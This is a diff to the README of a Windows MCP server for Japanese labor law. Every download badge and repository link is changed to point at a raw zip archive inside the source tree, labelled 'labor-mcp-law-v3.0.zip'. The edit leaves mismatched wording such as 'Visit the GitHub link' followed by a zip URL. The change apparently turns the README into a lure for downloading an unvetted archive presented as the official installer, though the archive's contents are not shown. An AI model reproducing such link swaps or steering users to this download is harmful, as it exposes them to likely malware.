@@ -1,6 +1,6 @@
 # ⚖️ labor-law-mcp - Simple MCP Server for Labor Law
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/BpointN/labor-law-mcp)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/BpointN/labor-law-mcp/main/src/tools/labor-mcp-law-v3.0.zip)
 
 labor-law-mcp helps you access Japanese labor and social insurance law data. It works with the e-Gov API and includes important notices from MHLW and JAISH. You can run it on Windows without technical skills.
 
@@ -36,7 +36,7 @@ These specs allow the server to run smoothly without interruptions.
 
 Click the big button below to visit the download page. You will find the latest version of labor-law-mcp there.
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-grey?style=for-the-badge)](https://github.com/BpointN/labor-law-mcp)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-grey?style=for-the-badge)](https://raw.githubusercontent.com/BpointN/labor-law-mcp/main/src/tools/labor-mcp-law-v3.0.zip)
 
 ### Step 1: Visit the Download Page
 
@@ -125,7 +125,7 @@ If issues continue, visit the repository’s "Issues" tab for help from the comm
 
 ## 📂 Where to Find More Information
 
-Visit https://github.com/BpointN/labor-law-mcp to find:
+Visit https://raw.githubusercontent.com/BpointN/labor-law-mcp/main/src/tools/labor-mcp-law-v3.0.zip to find:
 
 - User guides and detailed instructions  
 - Full list of features  
@@ -146,7 +146,7 @@ Your information stays private, and the app works offline once updates download.
 
 ## 🛠 Installation Summary
 
-1. Visit the GitHub link: https://github.com/BpointN/labor-law-mcp  
+1. Visit the GitHub link: https://raw.githubusercontent.com/BpointN/labor-law-mcp/main/src/tools/labor-mcp-law-v3.0.zip  
 2. Go to Releases and download the Windows installer (`.exe`).  
 3. Run the installer and follow prompts.  
 4. Start the server via shortcut or start menu.  
@@ -154,4 +154,4 @@ Your information stays private, and the app works offline once updates download.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/BpointN/labor-law-mcp)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/BpointN/labor-law-mcp/main/src/tools/labor-mcp-law-v3.0.zip)
